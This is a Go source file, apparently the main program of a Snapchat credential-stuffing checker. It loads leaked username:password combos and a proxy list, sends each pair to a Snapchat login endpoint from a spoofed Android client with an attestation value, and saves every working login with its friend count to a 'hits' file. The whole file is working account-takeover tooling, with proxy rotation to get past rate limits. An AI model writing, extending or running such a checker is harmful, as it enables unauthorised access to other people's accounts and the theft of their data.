package main

import (
	"app/src/request"
	"app/src/snapchat"
	"app/src/utils"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"
)

var (
	proxies  = []string{}
	accounts = []string{}
)

func init() {
	rand.Seed(time.Now().UnixNano())

	accounts = utils.OpenFile("./data/combos.txt")
	proxies = utils.OpenFile("./data/proxies.txt")
}

func main() {
	waitGroup := sync.WaitGroup{}
	for i := 0; i < len(accounts); i++ {
		waitGroup.Add(1)

		account := strings.Split(accounts[i], ":")
		proxy := proxies[rand.Intn(len(proxies))]
		proxy = fmt.Sprintf(proxy, utils.RandomString(6))

		go func(username, password, proxy string) {
			defer waitGroup.Done()

			client := request.Client(proxy)

			status, payload := snapchat.CheckAccount(client, map[string]string{
				"application_id":         "com.snapchat.android",
				"attestation":            "magicString",
				"client_id":              "",
				"cof_etag":               "",
				"cof_routing_tag":        "",
				"dtoken1i":               "",
				"fidelius_client_init":   "",
				"height":                 "1280",
				"max_video_height":       "1280",
				"max_video_width":        "720",
				"reactivation_confirmed": "false",
				"screen_height_in":       "4.0",
				"screen_height_px":       "1280",
				"screen_width_in":        "2.25",
				"screen_width_px":        "720",
				"timestamp":              fmt.Sprint(time.Now().UnixMilli()),
				"password":               password,
				"username":               username,
				"width":                  "720",
			})

			if status == "good" {
				content := fmt.Sprintf("%s:%s:%v\n",
					username,
					password,
					len(payload["friends_response"].(map[string]interface{})["friends"].([]interface{})),
				)
				utils.WriteFile("./data/hits/combos.txt", content)
			}
		}(account[0], account[1], proxy)
	}
	waitGroup.Wait()
}
